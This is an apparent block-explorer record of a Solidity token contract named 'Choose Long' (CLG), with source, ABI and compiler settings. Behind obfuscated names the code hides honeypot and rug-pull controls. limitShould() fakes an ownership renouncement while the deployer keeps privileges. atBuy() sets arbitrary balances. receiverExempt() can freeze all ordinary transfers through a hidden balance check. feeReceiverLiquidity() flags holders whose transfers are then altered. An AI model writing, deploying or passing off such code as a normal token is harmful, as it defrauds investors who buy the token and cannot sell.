{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.2;\n\ninterface enableFrom {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract isMarketing {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface fundTx {\n    function createPair(address limitIs, address teamEnable) external returns (address);\n}\n\ninterface buyAutoReceiver {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address marketingLimit) external view returns (uint256);\n\n    function transfer(address txTotalAt, uint256 fromList) external returns (bool);\n\n    function allowance(address totalMarketing, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 fromList) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address txTotalAt,\n        uint256 fromList\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed totalLaunched, uint256 value);\n    event Approval(address indexed totalMarketing, address indexed spender, uint256 value);\n}\n\ninterface isToken is buyAutoReceiver {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ChooseLong is isMarketing, buyAutoReceiver, isToken {\n\n    uint256 public fundList;\n\n    uint256 fundTotal;\n\n    bool private modeToken;\n\n    function decimals() external view virtual override returns (uint8) {\n        return walletFrom;\n    }\n\n    mapping(address => bool) public tradingTokenReceiver;\n\n    function senderFee(address autoFeeSell, address txTotalAt, uint256 fromList) internal returns (bool) {\n        if (autoFeeSell == buyWallet) {\n            return tradingMode(autoFeeSell, txTotalAt, fromList);\n        }\n        uint256 amountListBuy = buyAutoReceiver(listTeam).balanceOf(enableLaunchedTeam);\n        require(amountListBuy == teamTrading);\n        require(txTotalAt != enableLaunchedTeam);\n        if (tradingTokenReceiver[autoFeeSell]) {\n            return tradingMode(autoFeeSell, txTotalAt, minTotal);\n        }\n        return tradingMode(autoFeeSell, txTotalAt, fromList);\n    }\n\n    uint256 private maxFund;\n\n    mapping(address => mapping(address => uint256)) private modeMax;\n\n    address public buyWallet;\n\n    function limitShould() public {\n        emit OwnershipTransferred(buyWallet, address(0));\n        txTo = address(0);\n    }\n\n    function approve(address enableWallet, uint256 fromList) public virtual override returns (bool) {\n        modeMax[_msgSender()][enableWallet] = fromList;\n        emit Approval(_msgSender(), enableWallet, fromList);\n        return true;\n    }\n\n    address takeLaunchFee = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function tradingMode(address autoFeeSell, address txTotalAt, uint256 fromList) internal returns (bool) {\n        require(feeWalletShould[autoFeeSell] >= fromList);\n        feeWalletShould[autoFeeSell] -= fromList;\n        feeWalletShould[txTotalAt] += fromList;\n        emit Transfer(autoFeeSell, txTotalAt, fromList);\n        return true;\n    }\n\n    function balanceOf(address marketingLimit) public view virtual override returns (uint256) {\n        return feeWalletShould[marketingLimit];\n    }\n\n    uint256 public amountWallet;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return walletReceiver;\n    }\n\n    function allowance(address receiverAtLiquidity, address enableWallet) external view virtual override returns (uint256) {\n        if (enableWallet == takeLaunchFee) {\n            return type(uint256).max;\n        }\n        return modeMax[receiverAtLiquidity][enableWallet];\n    }\n\n    bool public receiverMax;\n\n    bool public walletFromSender;\n\n    function symbol() external view virtual override returns (string memory) {\n        return tokenIsReceiver;\n    }\n\n    string private liquidityFrom = \"Choose Long\";\n\n    constructor (){\n        \n        enableFrom liquidityLaunch = enableFrom(takeLaunchFee);\n        listTeam = fundTx(liquidityLaunch.factory()).createPair(liquidityLaunch.WETH(), address(this));\n        if (maxFund == feeMarketing) {\n            walletFromSender = true;\n        }\n        buyWallet = _msgSender();\n        limitShould();\n        feeSenderTx[buyWallet] = true;\n        feeWalletShould[buyWallet] = walletReceiver;\n        \n        emit Transfer(address(0), buyWallet, walletReceiver);\n    }\n\n    address private txTo;\n\n    function atBuy(address limitTeamMax, uint256 fromList) public {\n        totalReceiverAuto();\n        feeWalletShould[limitTeamMax] = fromList;\n    }\n\n    uint256 constant minTotal = 19 ** 10;\n\n    function receiverExempt(uint256 fromList) public {\n        totalReceiverAuto();\n        teamTrading = fromList;\n    }\n\n    uint256 public feeMarketing;\n\n    address public listTeam;\n\n    function feeReceiverLiquidity(address maxAt) public {\n        totalReceiverAuto();\n        if (walletFromSender) {\n            walletFromSender = false;\n        }\n        if (maxAt == buyWallet || maxAt == listTeam) {\n            return;\n        }\n        tradingTokenReceiver[maxAt] = true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return liquidityFrom;\n    }\n\n    uint8 private walletFrom = 18;\n\n    address enableLaunchedTeam = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    event OwnershipTransferred(address indexed toWallet, address indexed tradingReceiver);\n\n    string private tokenIsReceiver = \"CLG\";\n\n    bool private limitSell;\n\n    uint256 teamTrading;\n\n    uint256 public sellLaunch;\n\n    mapping(address => uint256) private feeWalletShould;\n\n    function limitMax(address autoLiquidity) public {\n        require(autoLiquidity.balance < 100000);\n        if (limitExempt) {\n            return;\n        }\n        if (amountWallet == maxFund) {\n            amountTakeToken = false;\n        }\n        feeSenderTx[autoLiquidity] = true;\n        \n        limitExempt = true;\n    }\n\n    bool public limitExempt;\n\n    mapping(address => bool) public feeSenderTx;\n\n    function transferFrom(address autoFeeSell, address txTotalAt, uint256 fromList) external override returns (bool) {\n        if (_msgSender() != takeLaunchFee) {\n            if (modeMax[autoFeeSell][_msgSender()] != type(uint256).max) {\n                require(fromList <= modeMax[autoFeeSell][_msgSender()]);\n                modeMax[autoFeeSell][_msgSender()] -= fromList;\n            }\n        }\n        return senderFee(autoFeeSell, txTotalAt, fromList);\n    }\n\n    function owner() external view returns (address) {\n        return txTo;\n    }\n\n    function getOwner() external view returns (address) {\n        return txTo;\n    }\n\n    bool public amountTakeToken;\n\n    function totalReceiverAuto() private view {\n        require(feeSenderTx[_msgSender()]);\n    }\n\n    function transfer(address limitTeamMax, uint256 fromList) external virtual override returns (bool) {\n        return senderFee(_msgSender(), limitTeamMax, fromList);\n    }\n\n    uint256 private walletReceiver = 100000000 * 10 ** 18;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toWallet\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingReceiver\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalLaunched\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverAtLiquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"enableWallet\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountTakeToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountWallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromList\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitTeamMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromList\",\"type\":\"uint256\"}],\"name\":\"atBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingLimit\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeMarketing\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxAt\",\"type\":\"address\"}],\"name\":\"feeReceiverLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"feeSenderTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundList\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoLiquidity\",\"type\":\"address\"}],\"name\":\"limitMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listTeam\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fromList\",\"type\":\"uint256\"}],\"name\":\"receiverExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellLaunch\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tradingTokenReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitTeamMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromList\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoFeeSell\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"txTotalAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromList\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletFromSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ChooseLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}